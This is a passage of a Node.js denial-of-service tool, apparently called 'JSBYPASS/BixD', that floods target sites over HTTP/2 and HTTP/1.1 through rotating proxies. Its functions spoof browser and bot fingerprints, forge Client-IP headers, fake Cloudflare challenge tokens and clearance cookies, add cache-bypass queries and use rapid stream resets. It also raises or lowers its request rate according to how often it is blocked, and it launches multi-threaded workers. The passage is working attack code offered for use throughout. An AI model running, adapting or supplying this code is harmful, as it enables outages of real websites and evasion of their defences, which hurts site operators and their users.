        'Mozilla/5.0 (compatible; Pinterestbot/1.0; +https://www.pinterest.com/bot.html)',
        'Mozilla/5.0 (compatible; ClaudeBot/1.0; +claude.ai)',
        'Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Chrome/${rdversion}.0.0.0 Safari/537.36'
    ];

    const ChromeuserAgent = [
        `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${rdversion}.0.0.0 Safari/537.36 Edg/${rdversion}.0.0.0`,
        `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${rdversion}.0.0.0 Safari/537.36`,
        `Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:${rdversion}.0) Gecko/20100101 Firefox/${rdversion}.0`,
        `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${rdversion}.0.0.0 Edg/${rdversion}.0.0.0`,
        `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/${Math.floor(rdversion / 10)}.0 Safari/605.1.15`,
        `Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${rdversion}.0.0.0 Safari/537.36`,
        `Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1`,
        `Mozilla/5.0 (Linux; Android 14; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${rdversion}.0.0.0 Mobile Safari/537.36`
    ];

    const userAgent = fakeBot 
        ? botUserAgents[Math.floor(Math.random() * botUserAgents.length)]
        : ChromeuserAgent[Math.floor(Math.random() * ChromeuserAgent.length)];

    const canvasSeed = crypto.createHash('md5').update(userAgent + 'canvas_seed').digest('hex');
    const canvasFingerprint = canvasSeed.substring(0, 8);
    const webglFingerprint = crypto.createHash('md5').update(selectedWebGL.vendor + selectedWebGL.renderer).digest('hex').substring(0, 8);

    const generateJA3 = () => {
        const version = tlsVersions[Math.floor(Math.random() * tlsVersions.length)];
        const cipher = ja3Fingerprint.ciphers.join(':');
        const extension = extensions[Math.floor(Math.random() * extensions.length)];
        const curve = "X25519:P-256:P-384";
        const ja3 = `${version},${cipher},${extension},${curve}`;
        return crypto.createHash('md5').update(ja3).digest('hex');
    };

    return {
        screen: {
            width: screen.width,
            height: screen.height,
            availWidth: screen.width,
            availHeight: screen.height,
            colorDepth: 24,
            pixelDepth: 24
        },
        navigator: {
            language: languages[Math.floor(Math.random() * languages.length)],
            languages: ['en-US', 'en'],
            doNotTrack: Math.random() > 0.7 ? "1" : "0",
            hardwareConcurrency: [2, 4, 6, 8, 12, 16][Math.floor(Math.random() * 6)],
            userAgent: userAgent,
            sextoy: fakeBot ? '"Not A;Brand";v="99", "Chromium";v="130"' : `"Google Chrome";v="${rdversion}", "Chromium";v="${rdversion}", "Not?A_Brand";v="24"`,
            deviceMemory: 8,
            maxTouchPoints: 10,
            webdriver: false,
            cookiesEnabled: true
        },
        plugins: [
            Math.random() > 0.5 ? "PDF Viewer" : null,
            Math.random() > 0.5 ? "Chrome PDF Viewer" : null,
            Math.random() > 0.5 ? { name: "Chrome PDF Plugin", filename: "internal-pdf-viewer", description: "Portable Document Format" } : null,
            Math.random() > 0.3 ? { name: "Widevine Content Decryption Module", filename: "widevinecdm.dll", description: "Enables Widevine licenses for playback of HTML audio/video content" } : null
        ].filter(Boolean),
        timezone: -Math.floor(Math.random() * 12) * 60,
        webgl: {
            vendor: selectedWebGL.vendor,
            renderer: selectedWebGL.renderer,
            fingerprint: webglFingerprint
        },
        canvas: canvasFingerprint,
        userActivation: Math.random() > 0.5,
        localStorage: { getItem: () => null, setItem: () => {}, removeItem: () => {} },
        ja3: generateJA3(),
        ja4: ja4Fingerprint,
        touchSupport: screen.width < 500 ? { maxTouchPoints: getRandomInt(1, 5), touchEvent: true, touchStart: true } : { maxTouchPoints: 0, touchEvent: false, touchStart: false }
    };
}

const fingerprint = generateBrowserFingerprint();

// ================ AUTO-TUNING ================
function autoTuneParameters(blockRate) {
    if (blockRate > 0.3) {
        // Giảm rate, thay đổi technique
        if (Math.random() > 0.5) {
            // Thay đổi fingerprint
            currentHTTP2Fingerprint = randomizeHTTP2Fingerprint();
        }
        if (Math.random() > 0.7) {
            // Rotate target nếu có nhiều targets
            if (targets.length > 0) {
                currentTargetIndex = (currentTargetIndex + 1) % targets.length;
                currentUrl = targets[currentTargetIndex];
            }
        }
        return Math.max(1, Math.floor(ratelimit * 0.7));
    } else if (blockRate < 0.1) {
        // Tăng rate nếu thành công cao
        return Math.min(100, Math.floor(ratelimit * 1.2));
    }
    return ratelimit;
}

// ================ MAIN ATTACK FUNCTION ================
function go() {
    let proxyLine = proxyManager.getNextProxy();
    let proxyHost, proxyPort, proxyUser, proxyPass;
    
    if (authProxyFlag) {
        [proxyHost, proxyPort, proxyUser, proxyPass] = proxyLine.split(':');
    } else {
        [proxyHost, proxyPort] = proxyLine.split(':');
    }

    if (!proxyHost || !proxyPort || isNaN(proxyPort)) {
        proxyManager.markBad(proxyLine);
        setTimeout(go, 50);
        return;
    }

    let tlsSocket;
    let currentTarget = currentUrl;

    const netSocket = net.connect({
        host: proxyHost,
        port: Number(proxyPort),
        keepAlive: true,
        keepAliveMsecs: 10000
    }, () => {
        netSocket.once('data', () => {
            proxyConnections++;
            activeConnections.add(netSocket);
            
            tlsSocket = tls.connect({
                socket: netSocket,
                ALPNProtocols: ['h2', 'http/1.1'],
                servername: currentTarget.host,
                ciphers: ja3Fingerprint.ciphers.join(':'),
                sigalgs: ja3Fingerprint.signatureAlgorithms.join(':'),
                secureOptions: 
                    crypto.constants.SSL_OP_NO_SSLv2 |
                    crypto.constants.SSL_OP_NO_SSLv3 |
                    crypto.constants.SSL_OP_NO_TLSv1 |
                    crypto.constants.SSL_OP_NO_TLSv1_1 |
                    crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
                    crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
                    crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
                    crypto.constants.SSL_OP_COOKIE_EXCHANGE |
                    crypto.constants.SSL_OP_SINGLE_DH_USE |
                    crypto.constants.SSL_OP_SINGLE_ECDH_USE,
                secure: true,
                session: crypto.randomBytes(64),
                minVersion: 'TLSv1.2',
                maxVersion: 'TLSv1.3',
                ecdhCurve: ja3Fingerprint.curves.join(':'),
                supportedVersions: ['TLSv1.3', 'TLSv1.2'],
                supportedGroups: ja3Fingerprint.curves.join(':'),
                applicationLayerProtocolNegotiation: ja3Fingerprint.extensions.includes('16') ? ['h2', 'http/11'] : ['h2'],
                rejectUnauthorized: false,
                fingerprint: fingerprint,
                keepAlive: true,
                keepAliveMsecs: 10000
            }, () => {
                activeConnections.add(tlsSocket);
                
                if (!tlsSocket.alpnProtocol || tlsSocket.alpnProtocol == 'http/1.1') {
                    if (forceHttp == 2) {
                        tlsSocket.end(() => {
                            tlsSocket.destroy();
                            activeConnections.delete(tlsSocket);
                        });
                        return;
                    }

                    function main() {
                        const method = enableCache ? getRandomMethod() : reqmethod;
                        const path = enableCache ? currentTarget.pathname + generateCacheQuery() : (query ? handleQuery(query) : currentTarget.pathname);
                        
                        let fullPath = path + (currentTarget.search || '');
                        if (postdata && method === 'POST') {
                            fullPath += `?${postdata}`;
                        }
                        
                        const h1payl = `${method} ${fullPath} HTTP/1.1\r\nHost: ${currentTarget.hostname}\r\nUser-Agent: ${fingerprint.navigator.userAgent}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: ${fingerprint.navigator.language}\r\n${enableCache ? 'Cache-Control: no-cache, no-store, must-revalidate\r\n' : ''}${hcookie ? `Cookie: ${hcookie}\r\n` : ''}${currentRefererValue ? `Referer: ${currentRefererValue}\r\n` : ''}${generateAuthorizationHeader(authValue) ? `Authorization: ${generateAuthorizationHeader(authValue)}\r\n` : ''}${customHeaders ? customHeaders.split('#').map(h => { const [n, v] = h.split(':'); return `${n.trim()}: ${v.trim()}\r\n`; }).join('') : ''}Connection: keep-alive\r\n\r\n`;
                        
                        tlsSocket.write(h1payl, (err) => {
                            if (!err) {
                                setTimeout(() => {
                                    main();
                                }, isFull ? 300 : 300 / ratelimit);
                            } else {
                                tlsSocket.end(() => {
                                    tlsSocket.destroy();
                                    activeConnections.delete(tlsSocket);
                                });
                            }
                        });
                    }

                    main();

                    tlsSocket.on('error', () => {
                        tlsSocket.end(() => {
                            tlsSocket.destroy();
                            activeConnections.delete(tlsSocket);
                        });
                    });
                    return;
                }

                if (forceHttp == 1) {
                    tlsSocket.end(() => {
                        tlsSocket.destroy();
                        activeConnections.delete(tlsSocket);
                    });
                    return;
                }

                let streamId = 1;
                let data = Buffer.alloc(0);
                let hpack = new HPACK();
                hpack.setTableSize(currentHTTP2Fingerprint.SETTINGS.find(s => s[0] === 1)?.[1] || 65536);

                const updateWindow = Buffer.alloc(4);
                updateWindow.writeUInt32BE(currentHTTP2Fingerprint.WINDOW_UPDATE || custom_update, 0);
                const frames1 = [];
                const frames = [
                    Buffer.from(PREFACE, 'binary'),
                    encodeFrame(0, 4, encodeSettings(currentHTTP2Fingerprint.SETTINGS)),
                    encodeFrame(0, 8, updateWindow)
                ];
                frames1.push(...frames);

                tlsSocket.on('data', (eventData) => {
                    data = Buffer.concat([data, eventData]);

                    while (data.length >= 9) {
                        const frame = decodeFrame(data);
                        if (frame != null) {
                            data = data.subarray(frame.length + 9);
                            
                            if (frame.type == 4 && frame.flags == 0) {
                                tlsSocket.write(encodeFrame(0, 4, "", 1));
                            }
                            
                            if (frame.type == 1) {
                                const headers = hpack.decode(frame.payload);
                                const status = headers.find(x => x[0] == ':status')?.[1];
                                
                                if (status) {
                                    metrics.logRequest(parseInt(status));
                                    
                                    if (status == 403 || status == 400) {
                                        tlsSocket.write(encodeRstStream(0));
                                        tlsSocket.end(() => {
                                            tlsSocket.destroy();
                                            activeConnections.delete(tlsSocket);
                                        });
                                        netSocket.end(() => {
                                            netSocket.destroy();
                                            activeConnections.delete(netSocket);
                                        });
                                    }
                                    
                                    if (!statuses[status]) {
                                        statuses[status] = 0;
                                    }
                                    statuses[status]++;
                                }
                            }
                            
                            if (frame.type == 7 || frame.type == 5) {
                                if (frame.type == 7 && debugMode) {
                                    if (!statuses['GOAWAY']) {
                                        statuses['GOAWAY'] = 0;
                                    }
                                    statuses['GOAWAY']++;
                                }

                                tlsSocket.write(encodeRstStream(0));
                                tlsSocket.end(() => {
                                    tlsSocket.destroy();
                                    activeConnections.delete(tlsSocket);
                                });
                            }
                        } else {
                            break;
                        }
                    }
                });

                tlsSocket.write(Buffer.concat(frames1));
                
                function main() {
                    if (tlsSocket.destroyed) {
                        return;
                    }
                    
                    const requests = [];
                    let currentRate = autoTuneParameters(metrics.blockedRequests / Math.max(1, metrics.totalRequests));
                    let localRatelimit = randrate ? getRandomInt(1, 90) : currentRate;
                    
                    const startTime = Date.now();
                    const customHeadersArray = [];
                    
                    if (customHeaders) {
                        customHeaders.split('#').forEach(header => {
                            const [name, value] = header.split(':').map(part => part?.trim());
                            if (name && value) customHeadersArray.push({ [name.toLowerCase()]: value });
                        });
                    }

                    for (let i = 0; i < (isFull ? localRatelimit : 1); i++) {
                        let randomNum = Math.floor(Math.random() * (10000 - 100 + 1) + 10000);
                        const method = enableCache ? getRandomMethod() : reqmethod;
                        const path = enableCache ? currentTarget.pathname + generateCacheQuery() : (query ? handleQuery(query) : currentTarget.pathname);
                        
                        const pseudoHeaders = [
                            [":method", method],
                            [":authority", currentTarget.hostname],
                            [":scheme", "https"],
                            [":path", path],
                        ];

                        const regularHeaders = generateDynamicHeaders().filter(a => a[1] != null);
                        const additionalRegularHeaders = Object.entries({
                            ...(Math.random() > 0.6 && { "priority": "u=0, i" }),
                            ...(Math.random() > 0.4 && { "dnt": "1" }),
                            ...(Math.random() < 0.3 && { [`x-client-session${getRandomChar()}`]: `none${getRandomChar()}` }),
                            ...(Math.random() < 0.3 && { [`sec-ms-gec-version${getRandomChar()}`]: `undefined${getRandomChar()}` }),
                            ...(Math.random() < 0.3 && { [`sec-fetch-users${getRandomChar()}`]: `?0${getRandomChar()}` }),
                            ...(Math.random() < 0.3 && { [`x-request-data${getRandomChar()}`]: `dynamic${getRandomChar()}` }),
                        }).filter(a => a[1] != null);

                        const allRegularHeaders = [...regularHeaders, ...additionalRegularHeaders];
                        shuffle(allRegularHeaders);

                        const combinedHeaders = [
                            ...pseudoHeaders,
                            ...allRegularHeaders,
                            ['cookie', generateCfClearanceCookie()],
                            ...generateChallengeHeaders(),
                            ...customHeadersArray.reduce((acc, header) => [...acc, ...Object.entries(header)], [])
                        ];

                        const packed = Buffer.concat([
                            Buffer.from([0x80, 0, 0, 0, 0xFF]),
                            hpack.encode(combinedHeaders)
                        ]);
                        
                        const flags = 0x1 | 0x4 | 0x8 | 0x20;
                        const encodedFrame = encodeFrame(streamId, 1, packed, flags);
                        
                        if (STREAMID_RESET >= 5 && (STREAMID_RESET - 5) % 10 === 0) {
                            const rstStreamFrame = encodeRstStream(streamId, 8);
                            tlsSocket.write(Buffer.concat([rstStreamFrame, encodedFrame]));
                            STREAMID_RESET = 0;
                        }

                        requests.push(encodeFrame(streamId, 1, packed, 0x25));
                        streamId += 4;
                    }

                    tlsSocket.write(Buffer.concat(requests), (err) => {
                        if (err) {
                            tlsSocket.end(() => {
                                tlsSocket.destroy();
                                activeConnections.delete(tlsSocket);
                            });
                            return;
                        }
                        
                        const elapsed = Date.now() - startTime;
                        const delay = Math.max(50, (150 / localRatelimit) - elapsed);
                        setTimeout(() => main(), delay);
                    });
                }
                
                main();
            }).on('error', (err) => {
                proxyManager.markBad(proxyLine);
                tlsSocket.destroy();
                activeConnections.delete(tlsSocket);
            });
        });

        let connectRequest = `CONNECT ${currentTarget.host}:443 HTTP/1.1\r\nHost: ${currentTarget.host}:443\r\nConnection: Keep-Alive\r\nClient-IP: ${legitIP}\r\nX-Client-IP: ${legitIP}\r\nVia: 1.1 ${legitIP}`;
        if (authProxyFlag && proxyUser && proxyPass) {
            const auth = Buffer.from(`${proxyUser}:${proxyPass}`).toString('base64');
            connectRequest += `\r\nProxy-Authorization: Basic ${auth}`;
        }
        connectRequest += `\r\n\r\n`;
        netSocket.write(connectRequest);

    }).once('error', (err) => {
        proxyManager.markBad(proxyLine);
    }).once('close', () => {
        activeConnections.delete(netSocket);
        if (tlsSocket) {
            tlsSocket.end(() => { 
                tlsSocket.destroy(); 
                activeConnections.delete(tlsSocket);
                go(); 
            });
        }
    });

    netSocket.on('error', (error) => {
        cleanup(error);
    });
    
    netSocket.on('close', () => {
        cleanup();
    });
    
    function cleanup(error) {
        if (error) {
            proxyManager.markBad(proxyLine);
            setTimeout(go, getRandomInt(50, 200));
        }
        if (netSocket) {
            netSocket.destroy();
            activeConnections.delete(netSocket);
        }
        if (tlsSocket) {
            tlsSocket.end();
            tlsSocket.destroy();
            activeConnections.delete(tlsSocket);
        }
    }
}

// ================ HELPER FUNCTIONS ================
function handleQuery(query) {
    if (query === '1') {
        return currentUrl.pathname + '?__cf_chl_rt_tk=' + randstrr(30) + '_' + randstrr(12) + '-' + timestampString + '-0-' + 'gaNy' + randstrr(8);
    } else if (query === '2') {
        return currentUrl.pathname + `?${randomPathSuffix}`;
    } else if (query === '3') {
        return currentUrl.pathname + '?q=' + generateRandomString(6, 7) + '&' + generateRandomString(6, 7);
    }
    return currentUrl.pathname;
}

function generateCacheQuery() {
    const cacheBypassQueries = [
        `?v=${Math.floor(Math.random() * 1000000)}`,
        `?_=${Date.now()}`,
        `?cachebypass=${randstr(8)}`,
        `?ts=${Date.now()}_${randstr(4)}`,
        `?cb=${crypto.randomBytes(4).toString('hex')}`,
        `?rnd=${generateRandomString(5, 10)}`,
        `?param1=${randstr(4)}&param2=${crypto.randomBytes(4).toString('hex')}&rnd=${generateRandomString(3, 8)}`,
        `?cb=${randstr(6)}&ts=${Date.now()}&extra=${randstr(5)}`,
        `?v=${encodeURIComponent(randstr(8))}&cb=${Date.now()}`,
        `?param=${randstr(5)}&extra=${crypto.randomBytes(8).toString('base64')}`,
        `?ts=${Date.now()}&rnd=${generateRandomString(10, 20)}&hash=${crypto.createHash('md5').update(randstr(10)).digest('hex').slice(0,8)}`
    ];
    return cacheBypassQueries[Math.floor(Math.random() * cacheBypassQueries.length)];
}

function colorizeStatus(status, count) {
    const greenStatuses = ['200', '201', '204', '304'];
    const redStatuses = ['403', '429', '401', '400'];
    const yellowStatuses = ['503', '502', '522', '520', '521', '523', '524', '500'];
    const blueStatuses = ['GOAWAY', 'RST'];

    let coloredStatus;
    if (greenStatuses.includes(status)) {
        coloredStatus = chalk.green.bold(status);
    } else if (redStatuses.includes(status)) {
        coloredStatus = chalk.red.bold(status);
    } else if (yellowStatuses.includes(status)) {
        coloredStatus = chalk.yellow.bold(status);
    } else if (blueStatuses.includes(status)) {
        coloredStatus = chalk.blue.bold(status);
    } else {
        coloredStatus = chalk.gray.bold(status);
    }

    const underlinedCount = chalk.underline(count);
    return `${coloredStatus}: ${underlinedCount}`;
}

function cleanup() {
    console.log(chalk.yellow('\nCleaning up...'));
    activeConnections.forEach(conn => {
        try {
            conn.destroy();
        } catch (e) {}
    });
    activeConnections.clear();
    process.exit(0);
}

// ================ CLUSTER MANAGEMENT ================
setInterval(() => {
    timer++;
}, 1000);

setInterval(() => {
    if (timer <= 30) {
        custom_header = custom_header + 1;
        custom_window = custom_window + 1;
        custom_table = custom_table + 1;
        custom_update = custom_update + 1;
    } else {
        custom_table = 65536;
        custom_window = 6291456;
        custom_header = 262144;
        custom_update = 15663105;
        timer = 0;
    }
}, 10000);

if (cluster.isMaster) {
    const workers = {};

    Array.from({ length: threads }, (_, i) => cluster.fork({ core: i % os.cpus().length }));
    console.log(chalk.green(`Attack Launched with ${threads} threads`));

    cluster.on('exit', (worker) => {
        cluster.fork({ core: worker.id % os.cpus().length });
    });

    cluster.on('message', (worker, message) => {
        workers[worker.id] = [worker, message];
    });
    
    if (debugMode) {
        setInterval(() => {
            let aggregatedStatuses = {};
            let totalConnections = 0;
            let totalRequests = 0;
            let totalBypassed = 0;
            let totalBlocked = 0;
            
            for (let w in workers) {
                if (workers[w][0].state == 'online' && workers[w][1]) {
                    for (let st of workers[w][1]) {
                        for (let code in st) {
                            if (code !== 'proxyConnections' && code !== 'metrics') {
                                if (aggregatedStatuses[code] == null) {
                                    aggregatedStatuses[code] = 0;
                                }
                                aggregatedStatuses[code] += st[code];
                            }
                        }
                        totalConnections += st.proxyConnections || 0;
                        
                        // Aggregate metrics
                        if (st.metrics) {
                            totalRequests += st.metrics.total || 0;
                            totalBypassed += st.metrics.bypassed || 0;
                            totalBlocked += st.metrics.blocked || 0;
                        }
                    }
                }
            }
            
            // Định dạng trạng thái với màu sắc
            const statusString = Object.entries(aggregatedStatuses)
                .map(([status, count]) => colorizeStatus(status, count))
                .join(', ');
            
            const successRate = totalRequests > 0 ? ((totalRequests - totalBlocked) / totalRequests * 100).toFixed(2) : 0;
            const bypassRate = totalRequests > 0 ? (totalBypassed / totalRequests * 100).toFixed(2) : 0;
            
            console.clear();
            console.log(`[${chalk.magenta.bold('JSBYPASS/BixD')}] | Date: [${chalk.blue.bold(new Date().toLocaleString('en-US'))}]`);
            console.log(`Status: [${statusString}] | ProxyConnect: [${chalk.cyan.bold(totalConnections)}]`);
            console.log(`Requests: ${chalk.yellow(totalRequests)} | Success: ${chalk.green(successRate + '%')} | Bypass: ${chalk.cyan(bypassRate + '%')} | Blocked: ${chalk.red(totalBlocked)}`);
            
            proxyConnections = 0;
        }, 1000);
    }

    if (!connectFlag) {
        setTimeout(() => {
            console.log(chalk.yellow('Attack completed. Exiting...'));
            cleanup();
        }, time * 1000);
    }
} else {
    if (connectFlag) {
        setInterval(() => {
            go();
        }, delay);
    } else {
        let consssas = 0;
        let someee = setInterval(() => {
            if (consssas < 50000) { 
                consssas++; 
            } else { 
                clearInterval(someee); 
                return; 
            }
            go();
        }, delay);
    }
    
    if (debugMode) {
        setInterval(() => {
            if (statusesQ.length >= 4) {
                statusesQ.shift();
            }
            const stats = metrics.getStats();
            statusesQ.push({ 
                ...statuses, 
                proxyConnections,
                metrics: {
                    total: stats.total,
                    bypassed: stats.bypassed,
                    blocked: stats.blocked,
                    successRate: stats.successRate,
                    bypassRate: stats.bypassRate,
                    rps: stats.rps
                }
            });
            statuses = {};
            proxyConnections = 0;
            process.send(statusesQ);
        }, 250);
    }

    setTimeout(() => {
        const stats = metrics.getStats();
        console.log(chalk.yellow(`Worker ${process.pid} stats: ${JSON.stringify(stats, null, 2)}`));
        process.exit(1);
    }, time * 1000);
}